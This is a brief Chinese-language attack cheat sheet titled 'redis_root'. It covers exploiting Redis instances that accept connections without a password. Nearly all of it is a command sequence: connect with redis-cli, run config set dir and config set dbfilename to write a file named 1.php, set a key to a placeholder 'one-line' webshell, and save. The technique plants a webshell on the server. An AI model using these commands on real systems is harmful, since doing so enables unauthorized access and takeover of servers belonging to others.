# redis_root

---

未授权

```
redis-cli -h xxx    //不需要密码，连接成功，即存在未授权漏洞

info   //resis信息
config set dir "路径"       //设置绝对路径
config set dbfilename 1.php //设置文件名
set xxx "一句话"             //设置文件内容
save
```

